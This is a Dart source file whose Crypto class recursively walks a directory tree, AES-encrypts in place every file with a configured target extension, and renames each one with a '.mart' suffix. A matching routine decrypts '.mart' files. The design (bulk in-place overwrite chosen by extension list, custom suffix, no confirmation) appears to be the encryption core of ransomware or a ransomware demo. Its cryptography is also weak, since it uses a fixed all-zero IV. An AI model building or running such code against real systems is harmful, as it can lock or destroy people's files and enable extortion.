import 'dart:io';
import 'dart:typed_data';
import 'package:encrypt/encrypt.dart';
import 'package:path/path.dart';

import '../util/manipulate_data.dart';
import '../util/config.dart';

class Crypto {
  String path;
  String key;

  Directory _path;

  Key _key;
  IV _iv;
  Encrypter _encrypter;

  Crypto(this.path, this.key) {
    _path = Directory(path);
    _key = Key.fromUtf8(key);
    _iv = IV.fromLength(16);
    _encrypter = Encrypter(AES(_key));
  }

  static Map<String, dynamic> _mapForResult() =>
      {"status": null, "amountFiles": null, "mode": null, "response": null};

  Future<Map<String, dynamic>> encryptFile() async {
    Map result = _mapForResult();
    result["mode"] = 'encrypt';
    try {
      int amountFiles = 0;
      List<FileSystemEntity> files = await _discoveryFiles();
      files.forEach((file) {
        if (file.runtimeType.toString() == "_File") {
          String fileName = basename(file.path);
          String extension = fileName.split(".").last.toLowerCase();

          if (Config.extensionsToEncrypt.contains(extension) &&
              !Config.extensionsToIgnore.contains(extension)) {
            String content = _readFileAsync(file.path);
            String contentEncrypted = getEncryptContent(content);
            _writeFileSync(file.path, contentEncrypted)
                .then((value) => file.rename(file.path + ".mart"));
            amountFiles += 1;
          }
        }
      });
      result["amountFiles"] = amountFiles;
      result["status"] = true;
      return result;
    } catch (error) {
      print(error.toString());
      result["status"] = false;
      result["response"] = "${error.toString()}";
      return result;
    }
  }

  Future<Map<String, dynamic>> decryptFile() async {
    Map result = _mapForResult();
    result["mode"] = 'decrypt';
    try {
      int amountFiles = 0;
      List<FileSystemEntity> files = await _discoveryFiles();
      files.forEach((file) {
        if (file.runtimeType.toString() == "_File") {
          String fileName = basename(file.path);
          String extension = fileName.split(".").last.toLowerCase();

          if (extension == "mart") {
            String contentEncrypted = _readFileAsync(file.path);

            if (ManipulateData.isBase64(contentEncrypted)) {
              String contentDecrypted = getDecryptContent(contentEncrypted);
              _writeFileSync(file.path, contentDecrypted).then(
                  (value) => file.rename(file.path.replaceAll('.mart', '')));
              amountFiles += 1;
            }
          }
        }
      });
      result["amountFiles"] = amountFiles;
      result["status"] = true;
      return result;
    } catch (error) {
      print(error.toString());
      result["status"] = false;
      result["response"] = "${error.toString()}";
      return result;
    }
  }

  String getEncryptContent(String str) =>
      _encrypter.encrypt(str, iv: _iv).base64;

  String getDecryptContent(String str) => _encrypter.decrypt64(str, iv: _iv);

  Future<List<FileSystemEntity>> _discoveryFiles() async {
    var lister = _path.list(recursive: true, followLinks: false);
    List listFiles = await lister.toList();
    return listFiles;
  }

  String _readFileAsync(String path) {
    File file = File(path);
    Uint8List futureContent = file.readAsBytesSync();
    return ManipulateData.convertCharCodesToString(futureContent);
  }

  Future<File> _writeFileSync(String path, String content) async {
    File file = File(path);
    Uint8List bytes = ManipulateData.convertStringToCharCodes(content);
    return file.writeAsBytes(bytes);
  }
}
